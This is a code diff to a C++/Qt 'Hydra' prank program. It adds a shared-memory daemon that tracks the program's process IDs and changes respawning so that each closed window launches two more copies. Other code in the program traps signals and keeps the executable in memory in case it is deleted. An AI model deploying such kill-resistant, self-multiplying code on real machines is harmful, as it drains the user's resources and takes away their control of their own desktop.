@@ -16,8 +16,10 @@
 
 // Standard
 #include <ctime>
+#include <stdint.h>
 #include <iostream>
 #include <iomanip>
+#include <cstdlib>
 
 // Graphic and sound
 #include "assets.h"
@@ -35,13 +37,14 @@
 
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
-//#define SEGMENT_SZ 1*1000*512 //512Kb
-#define SEGMENT_SZ 1*1000
+//#define MAX_NUM_PIDS 100000
+#define MAX_NUM_PIDS 200
+#define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
 
-long exe_length;
 QFile exe_file;
 QByteArray exe_data;
 int perms;
+long daemon_pid;
 
 // Since we may launch multiple times a second, we need something just a bit
 // more random than std::time()
@@ -68,13 +71,13 @@ void os_sleep(long ms) {
   return;
 }
 
-long os_get_pid() {
+int64_t os_get_pid() {
 #ifdef __unix__
-  return (long)getpid();
+  return (int64_t)getpid();
 #endif
 
 #ifdef WIN32
-  return (long)GetProcessId();
+  return (int64_t)GetProcessId();
 #endif
 }
 
@@ -82,27 +85,28 @@ static void button_response() {
   QApplication::quit();
 }
 
-void print_segment_hex(QSharedMemory *s) {
+void print_segment_as_hex(QSharedMemory *s) {
+  s->lock();
   unsigned char *data = (unsigned char*)s->data();
   int i=0;
   while (i < s->size()) {
-    for (int j=0;j<30;j++) {
+    for (int j=0;j<32;j++) {
       std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
       i++;
     }
     std::cout << std::endl;
   }
+  s->unlock();
 }
 
-void deamon_loop() {
-  QSharedMemory segment(QString::number(os_get_random()));
-  segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
-  print_segment_hex(&segment);
-
-  QProcess::startDetached(exe_file.fileName());
+void print_segment_as_long(QSharedMemory *s) {
+  int64_t *data = (int64_t*)s->data(); // 8 bytes
+  for (int i=0;i<s->size()/8; i++)
+    std::cout << data[i] << std::endl;
 }
 
-bool is_proc_alive(long pid) {
+
+bool proc_is_alive(long pid) {
 #ifdef __unix__
   kill(pid, 0);
   if (errno == ESRCH) {
@@ -120,6 +124,68 @@ bool is_proc_alive(long pid) {
   return true;
 }
 
+
+void deamon_loop() {
+
+  QSharedMemory segment(QString::number(os_get_pid()));
+  bool result = segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
+  std::cout << "s suze: " << segment.size() << std::endl;
+  result = segment.attach(QSharedMemory::ReadWrite);
+  //segment.unlock();
+
+  // Pass to argv[1] this "daemons" PID
+  std::cout << "daemon is pid " << os_get_pid() << std::endl;
+
+  print_segment_as_hex(&segment);
+
+  QStringList args;
+  args << QString::number(os_get_pid());
+  QProcess::startDetached(exe_file.fileName(), args);
+
+  while (true) {
+    os_sleep(1000);
+    int64_t *shmem = (int64_t*)segment.data();
+    segment.lock();
+    //print_segment_as_long(&segment);
+    //print_segment_as_hex(&segment);
+    std::cout << "--" << std::endl;
+
+    for (int i=0;i<MAX_NUM_PIDS-1;i++) {
+      if (shmem[i] == 0)
+        break;
+      std::cout << shmem[i] << " -> dead? -> " << proc_is_alive(shmem[i])  << std::endl;
+    }
+    segment.unlock();
+  }
+
+}
+
+void append_to_shmem(QString key) {
+  QSharedMemory segment(key);
+  segment.attach(QSharedMemory::ReadWrite);
+
+  int64_t *shmem = (int64_t*)segment.data();
+  segment.lock();
+
+  for (int i=0;i<MAX_NUM_PIDS-1;i++) {
+    if (shmem[i] == 0) {
+      shmem[i] = os_get_pid(); // Register our PID
+      segment.unlock();
+      return;
+    }
+  }
+  segment.unlock();
+
+  /* Somehow, we overran MAX_NUM_PIDS... 
+   * This means that either: 
+   *  * MAX_NUM_PIDS wasn't set high enough, 
+   *  * They have A LOT of RAM/CPU to spare,
+   *  * shmem was not zeroed out (is this possible?)
+   * in any case, their desktop surely has too many Hydras :)
+   */
+  exit(1);
+}
+
 void spawn_two_more() {
 
   QString exe_name = exe_file.fileName();
@@ -132,8 +198,17 @@ void spawn_two_more() {
     out_stream.close();
   }
 
-  QProcess::startDetached(exe_name);
-  QProcess::startDetached(exe_name);
+  // Daemon isn't dead, so start a new hydra with its PID
+  if (proc_is_alive(daemon_pid)) {
+    QStringList args;
+    args << QString::number(daemon_pid);
+    QProcess::startDetached(exe_name, args);
+    QProcess::startDetached(exe_name, args);
+  }
+  else  {
+    std::cout << "Daemon was killed?!?" << std::endl;
+    QProcess::startDetached(exe_name);
+  }
 }
 
 void spawn_wrapper(int i) {
@@ -158,6 +233,7 @@ void trap_setup() {
 int main(int argc, char* argv[])  {
 
   exe_file.setFileName(argv[0]);
+  std::cout << "argc " << argc << std::endl;
 
   // No PID in argv, so start daemon mode
   if (argc <= 1) {
@@ -165,7 +241,10 @@ int main(int argc, char* argv[])  {
     return 0;
   }
 
+  daemon_pid = atol(argv[1]);
   trap_setup();
+
+  append_to_shmem(QString::number(daemon_pid));
 
   // Read in the executable file, in case they try to delete it
   exe_file.open(QIODevice::ReadOnly);
